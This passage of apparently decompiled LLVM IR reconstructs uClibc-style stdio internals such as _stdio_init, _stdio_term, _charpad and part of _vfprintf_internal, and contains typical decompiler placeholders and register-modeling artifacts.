  uselistorder i32 %v0_804de65, { 1, 0 }
  uselistorder i32 %v1_804de5a, { 1, 0, 2 }
  uselistorder i32 %v1_804de1b, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_804de0a, { 1, 0 }
  uselistorder i32 %v0_804dddd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 1, 0, 2, 3, 4 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_804dfc1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804dfba, { 1, 0 }
  uselistorder label %dec_label_pc_804df2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804de9b, { 1, 0 }
  uselistorder label %dec_label_pc_804de8b, { 1, 0 }
  uselistorder label %dec_label_pc_804de48, { 1, 0 }
  uselistorder label %dec_label_pc_804de12, { 1, 0 }
  uselistorder label %dec_label_pc_804de04, { 1, 0 }
  uselistorder label %dec_label_pc_804ddf9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804dddd, { 1, 0 }
  uselistorder label %dec_label_pc_804ddca, { 1, 2, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804dfcd = load i32, i32* @edi, align 4
  %v0_804dfce = load i32, i32* @esi, align 4
  %v0_804dfcf = load i32, i32* @ebx, align 4
  store i32 %v0_804dfcf, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804dfd8 = call i32 @__errno_location(i32 %v0_804dfcf)
  store i32 %v1_804dfd8, i32* @edi, align 4
  %v0_804dfe2 = load i32, i32* @global_var_8058280.181, align 128
  store i32 %v0_804dfe2, i32* @esi, align 4
  %v1_804dfe8 = inttoptr i32 %v1_804dfd8 to i32*
  %v2_804dfe8 = load i32, i32* %v1_804dfe8, align 4
  store i32 %v2_804dfe8, i32* %ebp.global-to-local, align 4
  %v1_804dfec = call i32 @isatty(i32 0)
  %v0_804dff1 = load i32, i32* @ebx, align 4
  %v2_804dff3 = sub i32 %v0_804dff1, %v1_804dfec
  %v2_804dffe = mul i32 %v2_804dff3, 256
  %v0_804e001 = load i32, i32* @esi, align 4
  %v2_804e001 = xor i32 %v0_804e001, %v2_804dffe
  %v1_804e003 = trunc i32 %v2_804e001 to i16
  store i16 %v1_804e003, i16* bitcast (i32* @global_var_8058280.181 to i16*), align 128
  %v0_804e00a = load i32, i32* @global_var_80582d0.182, align 16
  store i32 %v0_804e00a, i32* @esi, align 4
  %v1_804e010 = call i32 @isatty(i32 1)
  %v0_804e015 = load i32, i32* @ebx, align 4
  %v2_804e015 = sub i32 %v0_804e015, %v1_804e010
  %v2_804e017 = mul i32 %v2_804e015, 256
  %v0_804e01a = load i32, i32* @esi, align 4
  %v2_804e01a = xor i32 %v2_804e017, %v0_804e01a
  %v1_804e01c = trunc i32 %v2_804e01a to i16
  store i16 %v1_804e01c, i16* bitcast (i32* @global_var_80582d0.182 to i16*), align 16
  %v0_804e023 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e023 = load i32, i32* @edi, align 4
  %v2_804e023 = inttoptr i32 %v1_804e023 to i32*
  store i32 %v0_804e023, i32* %v2_804e023, align 4
  %v2_804e028 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e028, i32* @ebx, align 4
  store i32 %v0_804dfce, i32* @esi, align 4
  store i32 %v0_804dfcd, i32* @edi, align 4
  ret i32 %v1_804e010

; uselistorder directives
  uselistorder i32 %v1_804dfd8, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804e03b = inttoptr i32 %arg1 to i16*
  %v4_804e03b = call i32 @memcpy(i16* %v3_804e03b, i32 ptrtoint (i32* @global_var_80561c0.191 to i32), i32 24)
  ret i32 %v4_804e03b
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e044 = load i32, i32* @esi, align 4
  %v0_804e045 = load i32, i32* @ebx, align 4
  store i32 %v0_804e045, i32* %stack_var_-8, align 4
  %v1_804e04e = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805823c.189 to i32))
  store i32 %v1_804e04e, i32* %eax.global-to-local, align 4
  %v1_804e05a = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8058254.185 to i32))
  store i32 %v1_804e05a, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_8058238.190 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804e0a422 = icmp eq i32 %storemerge21, 0
  %v1_804e0a623 = icmp eq i1 %v1_804e0a422, false
  br i1 %v1_804e0a623, label %dec_label_pc_804e067.lr.ph, label %dec_label_pc_804e0c4.preheader

dec_label_pc_804e067.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804e067

dec_label_pc_804e067:                             ; preds = %dec_label_pc_804e067.lr.ph, %dec_label_pc_804e08e
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_804e067.lr.ph ], [ %storemerge, %dec_label_pc_804e08e ]
  %v1_804e06a = add i32 %storemerge24, 56
  store i32 %v1_804e06a, i32* @esi, align 4
  %v1_804e06e = call i32 @__pthread_return_0(i32 %v1_804e06a)
  store i32 %v1_804e06e, i32* %eax.global-to-local, align 4
  %v1_804e076 = icmp eq i32 %v1_804e06e, 0
  br i1 %v1_804e076, label %dec_label_pc_804e08e, label %dec_label_pc_804e07a

dec_label_pc_804e07a:                             ; preds = %dec_label_pc_804e067
  %v0_804e07a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e07a = add i32 %v0_804e07a, 8
  %v2_804e07a = inttoptr i32 %v1_804e07a to i32*
  %v3_804e07a = load i32, i32* %v2_804e07a, align 4
  store i32 %v3_804e07a, i32* %eax.global-to-local, align 4
  %v1_804e07d = inttoptr i32 %v0_804e07a to i16*
  store i16 48, i16* %v1_804e07d, align 2
  %v0_804e082 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e082 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e082 = add i32 %v1_804e082, 24
  %v3_804e082 = inttoptr i32 %v2_804e082 to i32*
  store i32 %v0_804e082, i32* %v3_804e082, align 4
  %v0_804e085 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e085 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e085 = add i32 %v1_804e085, 28
  %v3_804e085 = inttoptr i32 %v2_804e085 to i32*
  store i32 %v0_804e085, i32* %v3_804e085, align 4
  %v0_804e088 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e088 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e088 = add i32 %v1_804e088, 16
  %v3_804e088 = inttoptr i32 %v2_804e088 to i32*
  store i32 %v0_804e088, i32* %v3_804e088, align 4
  %v0_804e08b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e08b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e08b = add i32 %v1_804e08b, 20
  %v3_804e08b = inttoptr i32 %v2_804e08b to i32*
  store i32 %v0_804e08b, i32* %v3_804e08b, align 4
  br label %dec_label_pc_804e08e

dec_label_pc_804e08e:                             ; preds = %dec_label_pc_804e067, %dec_label_pc_804e07a
  %v0_804e091 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e091 = add i32 %v0_804e091, 52
  %v2_804e091 = inttoptr i32 %v1_804e091 to i32*
  store i32 1, i32* %v2_804e091, align 4
  %v0_804e098 = load i32, i32* @esi, align 4
  %v1_804e099 = call i32 @__stdio_init_mutex(i32 %v0_804e098)
  store i32 %v1_804e099, i32* %eax.global-to-local, align 4
  %v0_804e09e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e09e = add i32 %v0_804e09e, 32
  %v2_804e09e = inttoptr i32 %v1_804e09e to i32*
  %storemerge = load i32, i32* %v2_804e09e, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804e0a4 = icmp eq i32 %storemerge, 0
  %v1_804e0a6 = icmp eq i1 %v1_804e0a4, false
  br i1 %v1_804e0a6, label %dec_label_pc_804e067, label %dec_label_pc_804e0a1.dec_label_pc_804e0c4.preheader_crit_edge

dec_label_pc_804e0a1.dec_label_pc_804e0c4.preheader_crit_edge: ; preds = %dec_label_pc_804e08e
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_8058238.190 to i32*), align 4
  br label %dec_label_pc_804e0c4.preheader

dec_label_pc_804e0c4.preheader:                   ; preds = %dec_label_pc_804e0a1.dec_label_pc_804e0c4.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804e0a1.dec_label_pc_804e0c4.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804e0c43 = icmp eq i32 %storemerge12, 0
  %v1_804e0c610 = icmp eq i1 %v1_804e0c43, false
  br i1 %v1_804e0c610, label %dec_label_pc_804e0b0.preheader, label %dec_label_pc_804e0c8

dec_label_pc_804e0b0.preheader:                   ; preds = %dec_label_pc_804e0c4.preheader
  br label %dec_label_pc_804e0b0

dec_label_pc_804e0b0:                             ; preds = %dec_label_pc_804e0b0.preheader, %dec_label_pc_804e0c1
  %v0_804e0b8 = phi i32 [ %storemerge1, %dec_label_pc_804e0c1 ], [ %storemerge12, %dec_label_pc_804e0b0.preheader ]
  %v1_804e0b0 = inttoptr i32 %v0_804e0b8 to i8*
  %v2_804e0b0 = load i8, i8* %v1_804e0b0, align 1
  %v3_804e0b0 = and i8 %v2_804e0b0, 64
  %v4_804e0b0 = icmp eq i8 %v3_804e0b0, 0
  br i1 %v4_804e0b0, label %dec_label_pc_804e0c1, label %dec_label_pc_804e0b5

dec_label_pc_804e0b5:                             ; preds = %dec_label_pc_804e0b0
  %v1_804e0b9 = call i32 @__stdio_wcommit(i32 %v0_804e0b8)
  store i32 %v1_804e0b9, i32* %eax.global-to-local, align 4
  %v0_804e0c1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e0c1

dec_label_pc_804e0c1:                             ; preds = %dec_label_pc_804e0b0, %dec_label_pc_804e0b5
  %v0_804e0c1 = phi i32 [ %v0_804e0b8, %dec_label_pc_804e0b0 ], [ %v0_804e0c1.pre, %dec_label_pc_804e0b5 ]
  %v1_804e0c1 = add i32 %v0_804e0c1, 32
  %v2_804e0c1 = inttoptr i32 %v1_804e0c1 to i32*
  %storemerge1 = load i32, i32* %v2_804e0c1, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804e0c4 = icmp eq i32 %storemerge1, 0
  %v1_804e0c6 = icmp eq i1 %v1_804e0c4, false
  br i1 %v1_804e0c6, label %dec_label_pc_804e0b0, label %dec_label_pc_804e0c8

dec_label_pc_804e0c8:                             ; preds = %dec_label_pc_804e0c1, %dec_label_pc_804e0c4.preheader
  %v2_804e0c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e0c8, i32* %eax.global-to-local, align 4
  %v2_804e0c9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e0c9, i32* @ebx, align 4
  store i32 %v0_804e044, i32* @esi, align 4
  ret i32 %v2_804e0c8

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_804e0c1, { 1, 0 }
  uselistorder label %dec_label_pc_804e0b0, { 1, 0 }
  uselistorder label %dec_label_pc_804e08e, { 1, 0 }
  uselistorder label %dec_label_pc_804e067, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804e0cc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e0d4 = add i32 %arg1, 8
  %v2_804e0d4 = inttoptr i32 %v1_804e0d4 to i32*
  %v3_804e0d4 = load i32, i32* %v2_804e0d4, align 4
  store i32 %v3_804e0d4, i32* %edx.global-to-local, align 4
  %v1_804e0d7 = add i32 %arg1, 16
  %v2_804e0d7 = inttoptr i32 %v1_804e0d7 to i32*
  %v3_804e0d7 = load i32, i32* %v2_804e0d7, align 4
  %v2_804e0da = sub i32 %v3_804e0d7, %v3_804e0d4
  %v12_804e0da = icmp eq i32 %v2_804e0da, 0
  store i32 %v2_804e0da, i32* %eax.global-to-local, align 4
  br i1 %v12_804e0da, label %dec_label_pc_804e0ed, label %dec_label_pc_804e0de

dec_label_pc_804e0de:                             ; preds = %entry
  store i32 %v3_804e0d4, i32* %v2_804e0d7, align 4
  %v0_804e0e1 = load i32, i32* @ecx, align 4
  %v0_804e0e2 = load i32, i32* %eax.global-to-local, align 4
  %v0_804e0e3 = load i32, i32* %edx.global-to-local, align 4
  %v0_804e0e4 = load i32, i32* @ebx, align 4
  %v4_804e0e5 = inttoptr i32 %v0_804e0e4 to i16*
  %v5_804e0e5 = call i32 @__stdio_WRITE(i16* %v4_804e0e5, i32 %v0_804e0e3, i32 %v0_804e0e2, i32 %v0_804e0e1)
  store i32 %v5_804e0e5, i32* %eax.global-to-local, align 4
  %v0_804e0ed.pre = load i32, i32* @ebx, align 4
  %v2_804e0f3.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e0ed

dec_label_pc_804e0ed:                             ; preds = %entry, %dec_label_pc_804e0de
  %v2_804e0f3 = phi i32 [ %tmp11, %entry ], [ %v2_804e0f3.pre, %dec_label_pc_804e0de ]
  %v0_804e0ed = phi i32 [ %arg1, %entry ], [ %v0_804e0ed.pre, %dec_label_pc_804e0de ]
  %v1_804e0ed = add i32 %v0_804e0ed, 16
  %v2_804e0ed = inttoptr i32 %v1_804e0ed to i32*
  %v3_804e0ed = load i32, i32* %v2_804e0ed, align 4
  store i32 %v3_804e0ed, i32* %eax.global-to-local, align 4
  %v2_804e0f0 = add i32 %v0_804e0ed, 8
  %v3_804e0f0 = inttoptr i32 %v2_804e0f0 to i32*
  %v4_804e0f0 = load i32, i32* %v3_804e0f0, align 4
  %v5_804e0f0 = sub i32 %v3_804e0ed, %v4_804e0f0
  store i32 %v5_804e0f0, i32* %eax.global-to-local, align 4
  store i32 %v2_804e0f3, i32* @edx, align 4
  store i32 %v0_804e0cc, i32* @ebx, align 4
  ret i32 %v5_804e0f0

; uselistorder directives
  uselistorder i32 %v0_804e0ed, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e0ed, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804e0f8 = load i32, i32* @edi, align 4
  %v0_804e0f9 = load i32, i32* @esi, align 4
  %v0_804e0fa = load i32, i32* @ebx, align 4
  %v0_804e0fb = load i32, i32* @eax, align 4
  store i32 %v0_804e0fb, i32* @edi, align 4
  %v0_804e100 = load i32, i32* @ecx, align 4
  store i32 %v0_804e100, i32* @esi, align 4
  store i32 %v0_804e100, i32* @ebx, align 4
  %v0_804e104 = load i32, i32* @edx, align 4
  store i32 %v0_804e104, i32* %stack_var_-13, align 4
  %v1_804e10b2 = icmp eq i32 %v0_804e100, 0
  br i1 %v1_804e10b2, label %dec_label_pc_804e123, label %dec_label_pc_804e10f.lr.ph

dec_label_pc_804e10f.lr.ph:                       ; preds = %entry
  %v2_804e10f = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804e10f

dec_label_pc_804e10a:                             ; preds = %dec_label_pc_804e10f
  %v1_804e10a = add i32 %v0_804e10a, -1
  %v8_804e10a = icmp eq i32 %v1_804e10a, 0
  store i32 %v1_804e10a, i32* @ebx, align 4
  br i1 %v8_804e10a, label %dec_label_pc_804e123.loopexit, label %dec_label_pc_804e10a.dec_label_pc_804e10f_crit_edge

dec_label_pc_804e10a.dec_label_pc_804e10f_crit_edge: ; preds = %dec_label_pc_804e10a
  %v0_804e113.pre = load i32, i32* @edx, align 4
  %v0_804e114.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e10f

dec_label_pc_804e10f:                             ; preds = %dec_label_pc_804e10a.dec_label_pc_804e10f_crit_edge, %dec_label_pc_804e10f.lr.ph
  %v0_804e114 = phi i32 [ %v0_804e114.pre, %dec_label_pc_804e10a.dec_label_pc_804e10f_crit_edge ], [ %v0_804e0fb, %dec_label_pc_804e10f.lr.ph ]
  %v0_804e113 = phi i32 [ %v0_804e113.pre, %dec_label_pc_804e10a.dec_label_pc_804e10f_crit_edge ], [ %v0_804e104, %dec_label_pc_804e10f.lr.ph ]
  %v4_804e118 = call i32 @__stdio_fwrite(i32 %v2_804e10f, i32 1, i32 %v0_804e114, i32 %v0_804e113)
  %v8_804e120 = icmp eq i32 %v4_804e118, 1
  %v0_804e10a = load i32, i32* @ebx, align 4
  br i1 %v8_804e120, label %dec_label_pc_804e10a, label %dec_label_pc_804e123.loopexit

dec_label_pc_804e123.loopexit:                    ; preds = %dec_label_pc_804e10a, %dec_label_pc_804e10f
  %v1_804e123.ph = phi i32 [ %v0_804e10a, %dec_label_pc_804e10f ], [ 0, %dec_label_pc_804e10a ]
  %v0_804e123.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e123

dec_label_pc_804e123:                             ; preds = %dec_label_pc_804e123.loopexit, %entry
  %v0_804e123 = phi i32 [ 0, %entry ], [ %v0_804e123.pre, %dec_label_pc_804e123.loopexit ]
  %v1_804e123 = phi i32 [ 0, %entry ], [ %v1_804e123.ph, %dec_label_pc_804e123.loopexit ]
  %v2_804e123 = sub i32 %v0_804e123, %v1_804e123
  store i32 %v0_804e0fa, i32* @ebx, align 4
  store i32 %v0_804e0f9, i32* @esi, align 4
  store i32 %v0_804e0f8, i32* @edi, align 4
  ret i32 %v2_804e123

; uselistorder directives
  uselistorder i32 %v1_804e10a, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804e123.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804e141 = trunc i32 %arg2 to i8
  %v5_804e141 = icmp slt i8 %v3_804e141, 0
  %v1_804e143 = icmp eq i1 %v5_804e141, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804e143, label %dec_label_pc_804e174, label %dec_label_pc_804e145

dec_label_pc_804e145:                             ; preds = %entry
  %v3_804e14c = call i32 @strlen(i8* %arg4)
  %v0_804e154 = load i32, i32* @ebx, align 4
  %v2_804e154 = sub i32 %v0_804e154, %v3_804e14c
  store i32 %v2_804e154, i32* @ebx, align 4
  store i32 %v3_804e14c, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804e154, 1
  br i1 %tmp23, label %dec_label_pc_804e172, label %dec_label_pc_804e15c

dec_label_pc_804e15c:                             ; preds = %dec_label_pc_804e145
  %v0_804e15c = load i32, i32* @edi, align 4
  %v1_804e15c = urem i32 %v0_804e15c, 128
  store i32 %v1_804e15c, i32* @edi, align 4
  store i32 %v2_804e154, i32* @ecx, align 4
  store i32 %v1_804e15c, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_804e167 = call i32 @_charpad()
  store i32 %v0_804e167, i32* @ebp, align 4
  %v12_804e16e = icmp eq i32 %v0_804e167, %v2_804e154
  %v1_804e170 = icmp eq i1 %v12_804e16e, false
  br i1 %v1_804e170, label %dec_label_pc_804e18e, label %dec_label_pc_804e15c.dec_label_pc_804e172_crit_edge

dec_label_pc_804e15c.dec_label_pc_804e172_crit_edge: ; preds = %dec_label_pc_804e15c
  %v0_804e172.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e172

dec_label_pc_804e172:                             ; preds = %dec_label_pc_804e15c.dec_label_pc_804e172_crit_edge, %dec_label_pc_804e145
  %v0_804e172 = phi i32 [ %v0_804e172.pre, %dec_label_pc_804e15c.dec_label_pc_804e172_crit_edge ], [ %v3_804e14c, %dec_label_pc_804e145 ]
  store i32 %v0_804e172, i32* @ebx, align 4
  br label %dec_label_pc_804e174

dec_label_pc_804e174:                             ; preds = %entry, %dec_label_pc_804e172
  %v0_804e17f = phi i32 [ %arg3, %entry ], [ %v0_804e172, %dec_label_pc_804e172 ]
  %tmp24 = icmp slt i32 %v0_804e17f, 1
  br i1 %tmp24, label %dec_label_pc_804e18c, label %dec_label_pc_804e17a

dec_label_pc_804e17a:                             ; preds = %dec_label_pc_804e174
  %v0_804e17a = load i32, i32* @ecx, align 4
  %v5_804e184 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804e17f, i32 %arg1, i32 %v0_804e17a)
  br label %dec_label_pc_804e18c

dec_label_pc_804e18c:                             ; preds = %dec_label_pc_804e174, %dec_label_pc_804e17a
  %v1_804e18c = phi i32 [ 0, %dec_label_pc_804e174 ], [ %v5_804e184, %dec_label_pc_804e17a ]
  %v0_804e18c = load i32, i32* @ebp, align 4
  %v2_804e18c = add i32 %v0_804e18c, %v1_804e18c
  br label %dec_label_pc_804e18e

dec_label_pc_804e18e:                             ; preds = %dec_label_pc_804e15c, %dec_label_pc_804e18c
  %v0_804e191 = phi i32 [ %v0_804e167, %dec_label_pc_804e15c ], [ %v2_804e18c, %dec_label_pc_804e18c ]
  ret i32 %v0_804e191

; uselistorder directives
  uselistorder i32 %v0_804e17f, { 1, 0 }
  uselistorder i32 %v0_804e167, { 1, 0, 2 }
  uselistorder i32 %v1_804e15c, { 1, 0 }
  uselistorder i32 %v2_804e154, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e18e, { 1, 0 }
  uselistorder label %dec_label_pc_804e18c, { 1, 0 }
  uselistorder label %dec_label_pc_804e174, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_804e1a2 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e1a2, i32* @ebx, align 4
  %v2_804e1aa = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804e1aa, i32* @esi, align 4
  %v5_804e1af = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804e1a2)
  store i32 %v5_804e1af, i32* %eax.global-to-local, align 4
  %v2_804e1b7 = icmp slt i32 %v5_804e1af, 0
  %v1_804e1b9 = icmp eq i1 %v2_804e1b7, false
  br i1 %v1_804e1b9, label %dec_label_pc_804e1f9, label %dec_label_pc_804e1bb

dec_label_pc_804e1bb:                             ; preds = %entry
  %v3_804e1bb = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804e1bb, i32* @ebx, align 4
  %v5_804e1c2 = inttoptr i32 %v3_804e1bb to i8*
  %v3_804e1c3 = call i32 @strlen(i8* %v5_804e1c2)
  store i32 %v3_804e1c3, i32* %eax.global-to-local, align 4
  %v1_804e1cb = icmp eq i32 %v3_804e1c3, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_804e1cb, label %dec_label_pc_804e732, label %dec_label_pc_804e1da

dec_label_pc_804e1da:                             ; preds = %dec_label_pc_804e1bb
  %v0_804e1da = load i32, i32* @edx, align 4
  %v0_804e1e3 = load i32, i32* @ebx, align 4
  %v6_804e1e4 = call i32 @__stdio_fwrite(i32 %v0_804e1e3, i32 %v3_804e1c3, i32 %arg1, i32 %v0_804e1da)
  store i32 %v6_804e1e4, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_804e732

dec_label_pc_804e1f9:                             ; preds = %entry
  %v6_804e203 = call i32 @_ppfs_prepargs(i32 %v2_804e1aa, i32 %arg3, i32 %v5_804e1af, i32 %v5_804e1af)
  store i32 %v6_804e203, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804e210 = load i32, i32* @ebx, align 4
  store i32 %v0_804e210, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e218

dec_label_pc_804e217:                             ; preds = %dec_label_pc_804e21e
  %v1_804e217 = add i32 %v0_804e226, 1
  store i32 %v1_804e217, i32* @ebx, align 4
  br label %dec_label_pc_804e218.backedge

dec_label_pc_804e218.backedge:                    ; preds = %dec_label_pc_804e217, %dec_label_pc_804e718, %dec_label_pc_804e723
  %v1_804e22219 = phi i32 [ %v1_804e22a, %dec_label_pc_804e217 ], [ %v3_804e718, %dec_label_pc_804e718 ], [ %v1_804e256, %dec_label_pc_804e723 ]
  %v0_804e21817 = phi i32 [ %v1_804e217, %dec_label_pc_804e217 ], [ %v3_804e718, %dec_label_pc_804e718 ], [ %v1_804e723, %dec_label_pc_804e723 ]
  %v4_804e218.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e218

dec_label_pc_804e218:                             ; preds = %dec_label_pc_804e218.backedge, %dec_label_pc_804e1f9
  %v1_804e22a = phi i32 [ %v1_804e22219, %dec_label_pc_804e218.backedge ], [ %v0_804e210, %dec_label_pc_804e1f9 ]
  %v0_804e226 = phi i32 [ %v0_804e21817, %dec_label_pc_804e218.backedge ], [ %v0_804e210, %dec_label_pc_804e1f9 ]
  %v4_804e218 = phi i32 [ %v4_804e218.pre, %dec_label_pc_804e218.backedge ], [ %v6_804e203, %dec_label_pc_804e1f9 ]
  %v1_804e218 = inttoptr i32 %v0_804e226 to i8*
  %v2_804e218 = load i8, i8* %v1_804e218, align 1
  %v3_804e218 = zext i8 %v2_804e218 to i32
  %v5_804e218 = and i32 %v4_804e218, -256
  %v6_804e218 = or i32 %v3_804e218, %v5_804e218
  store i32 %v6_804e218, i32* %eax.global-to-local, align 4
  %v4_804e21a = icmp eq i8 %v2_804e218, 0
  br i1 %v4_804e21a, label %dec_label_pc_804e222, label %dec_label_pc_804e21e

dec_label_pc_804e21e:                             ; preds = %dec_label_pc_804e218
  %v10_804e21e = icmp eq i8 %v2_804e218, 37
  %v1_804e220 = icmp eq i1 %v10_804e21e, false
  br i1 %v1_804e220, label %dec_label_pc_804e217, label %dec_label_pc_804e222

dec_label_pc_804e222:                             ; preds = %dec_label_pc_804e21e, %dec_label_pc_804e218
  %v2_804e222 = sub i32 %v0_804e226, %v1_804e22a
  %v12_804e222 = icmp eq i32 %v2_804e222, 0
  br i1 %v12_804e222, label %dec_label_pc_804e24d, label %dec_label_pc_804e226

dec_label_pc_804e226:                             ; preds = %dec_label_pc_804e222
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804e222, i32* @esi, align 4
  %tmp66 = icmp slt i32 %v2_804e222, 1
  br i1 %tmp66, label %dec_label_pc_804e242, label %dec_label_pc_804e230

dec_label_pc_804e230:                             ; preds = %dec_label_pc_804e226
  %v0_804e230 = load i32, i32* @ebp, align 4
  %v1_804e230 = load i32, i32* @esp, align 4
  %v2_804e230 = add i32 %v1_804e230, -4
  %v3_804e230 = inttoptr i32 %v2_804e230 to i32*
  store i32 %v0_804e230, i32* %v3_804e230, align 4
  %v1_804e231 = add i32 %v1_804e230, 368
  %v2_804e231 = inttoptr i32 %v1_804e231 to i32*
  %v3_804e231 = load i32, i32* %v2_804e231, align 4
  %v5_804e231 = add i32 %v1_804e230, -8
  %v6_804e231 = inttoptr i32 %v5_804e231 to i32*
  store i32 %v3_804e231, i32* %v6_804e231, align 4
  %v0_804e238 = load i32, i32* @esi, align 4
  %v2_804e238 = add i32 %v1_804e230, -12
  %v3_804e238 = inttoptr i32 %v2_804e238 to i32*
  store i32 %v0_804e238, i32* %v3_804e238, align 4
  %v0_804e239 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e239 = add i32 %v1_804e230, -16
  %v3_804e239 = inttoptr i32 %v2_804e239 to i32*
  store i32 %v0_804e239, i32* %v3_804e239, align 4
  %v0_804e23a = load i32, i32* %stack_var_-364, align 4
  %v4_804e23a = call i32 @__stdio_fwrite(i32 %v0_804e23a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e23a, i32* %eax.global-to-local, align 4
  %v1_804e242.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e242

dec_label_pc_804e242:                             ; preds = %dec_label_pc_804e226, %dec_label_pc_804e230
